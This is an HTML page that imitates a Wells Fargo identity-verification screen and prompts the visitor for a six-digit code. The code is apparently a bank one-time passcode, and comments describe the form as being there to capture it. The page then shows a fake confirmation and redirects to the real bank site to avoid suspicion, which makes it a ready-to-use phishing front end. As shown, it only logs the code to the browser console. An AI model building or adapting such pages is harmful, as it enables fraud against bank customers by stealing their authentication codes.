<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wells Fargo - Verifying</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Wells Fargo Sans', Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }
        .logo {
            font-weight: bold;
            font-size: 28px;
            color: #d71e28;
            margin-bottom: 30px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #d71e28;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            font-size: 20px;
            color: #333;
            margin: 0 0 15px;
        }
        p {
            font-size: 14px;
            color: #666;
            margin: 0 0 20px;
        }
        
        /* Styling for the 6-digit code input */
        .code-input {
            width: 220px;
            padding: 12px;
            font-size: 24px;
            text-align: center;
            letter-spacing: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            margin-bottom: 20px;
            outline: none;
            transition: border 0.3s;
        }
        .code-input:focus {
            border-color: #d71e28;
            box-shadow: 0 0 5px rgba(215, 30, 40, 0.3);
        }
        
        /* Success State */
        .success-message {
            display: none;
            color: #2e7d32;
            font-weight: bold;
            font-size: 16px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">WELLS FARGO</div>

        <!-- LOADING STATE WITH CODE INPUT -->
        <div id="loadingState">
            <div class="spinner"></div>
            <h2>Verifying Identity...</h2>
            
            <!-- Form to capture the code -->
            <form id="codeForm" onsubmit="submitCode(event)">
                <input 
                    type="text" 
                    id="codeInput" 
                    class="code-input" 
                    placeholder="______" 
                    maxlength="6" 
                    inputmode="numeric" 
                    pattern="[0-9]*"
                    required
                    autocomplete="off"
                >
                <p>Please wait while we confirm your details.</p>
            </form>
        </div>

        <!-- Success Message (Shown briefly before redirect) -->
        <div id="finalSuccess" class="success-message">
            Identity Confirmed!<br>
            <span style="font-size: 12px; color: #666;">Redirecting...</span>
        </div>
    </div>

    <script>
        // Auto-focus the input box on load
        window.onload = function() {
            document.getElementById('codeInput').focus();
        };

        function submitCode(event) {
            event.preventDefault(); // Stop page refresh
            
            var code = document.getElementById('codeInput').value;
            
            // 1. Hide the input form
            document.getElementById('codeForm').style.display = 'none';
            
            // 2. Change text to "Confirming Code..." to show activity
            var loadingState = document.getElementById('loadingState');
            loadingState.querySelector('h2').innerText = "Confirming Code...";
            loadingState.querySelector('p').innerText = "Please wait while we confirm your details.";

            // 3. Simulate a 2-second delay to "process" the code
            setTimeout(function() {
                // Hide the first loading state
                loadingState.style.display = 'none';
                
                // Show success message
                document.getElementById('finalSuccess').style.display = 'block';
                
                // Optional: Log the code to the browser console
                console.log("User entered code: " + code);
                
                // REDIRECT TO WELLS FARGO
                // Change the URL below if you want to go to a specific sub-page
                window.location.href = "https://www.wellsfargo.com/";
                
            }, 2000);
        }

        // Optional: Auto-advance to submit when 6 digits are typed
        document.getElementById('codeInput').addEventListener('input', function(e) {
            if (this.value.length === 6) {
                // Optional: Submit immediately after typing the 6th digit
                // submitCode(e); 
            }
        });
    </script>

</body>
</html>
